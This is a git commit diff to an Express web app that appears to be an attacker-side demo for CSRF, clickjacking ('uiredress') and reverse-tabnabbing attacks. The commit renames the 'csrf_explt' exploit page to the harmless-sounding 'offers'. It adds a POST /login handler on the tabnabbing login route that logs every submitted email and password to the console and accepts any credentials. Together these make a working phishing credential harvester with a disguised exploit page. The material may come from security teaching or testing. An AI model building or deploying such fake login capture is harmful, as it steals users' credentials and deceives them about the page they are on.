f072c54d3e30282d371b440400f67ac256caa295
Your Name <you@example.com>
2023-05-02 22:42:05 +0530

    last v1

--- controllers/user.js
+++ controllers/user.js
@@ -11,7 +11,7 @@ exports.home = function(req,res){
     }
 
 
-exports.csrf_explt = function(req,res){
+exports.offers = function(req,res){
         res.render("pages/csrf_explt",{
             "error":"",
             "isLoggedIn": false
@@ -46,6 +46,38 @@ exports.read_article = function(req,res){
         });
     }
 
+exports.processLogin = async function(req,res){
+        // get the data.
+        let email = req.body.email;
+        let password = req.body.password;
+        // check if we have data.
+        console.log('email :'+email)
+        console.log('password :'+password)
+        if(email && password){
+                if(1==1){
+                    // set the session.
+                    //req.session.user = existingUser._id;
+                    //console.log(' session_id ' + existingUser._id)
+                    //console.log(' req.session.user ' + req.session.user)
+                    // Redirect to the home page.
+                    //console.log('processLogin Session before login : '+req.session.user)
+                    //res.redirect("pages/home");
+                    res.render("pages/home");
+                }else{
+                    // return an error.
+                    res.render("pages/login",{
+                        "error":"Invalid password",
+                        isLoggedIn: false
+                    });
+                }
+            }else{
+                // return an error.
+                res.render("pages/login",{
+                    "error":"User with that email does not exist.",
+                    isLoggedIn:false
+                });
+            }
+        } 
 
 exports.logger = function(req,res){
         console.log('check cookies for xss and credentials for tabnabbing')
--- routes/index.js
+++ routes/index.js
@@ -3,15 +3,17 @@ const router = express.Router();
 
 //const {homePage,loginPage,processLogin,signupPage,processSignup,logoutPage} = require("../controllers/user");
 
-const {home,csrf_explt,uiredress,tabnab,tabnab_script,read_article,logger} = require("../controllers/user");
+const {home,offers,uiredress,tabnab,tabnab_script,read_article,logger,processLogin} = require("../controllers/user");
 
 router.get("/",home); // Home page
 
-router.get("/csrf_explt",csrf_explt); // Home page
+router.get("/offers",offers); // Home page
 
 router.get("/uiredress",uiredress); // Home page reverse_tab
 
 router.get("/login",tabnab); // Home page reverse_tab
+
+router.post("/login",processLogin); // Process login
 
 router.get("/tabnab_script",tabnab_script); // Home page reverse_tab
 
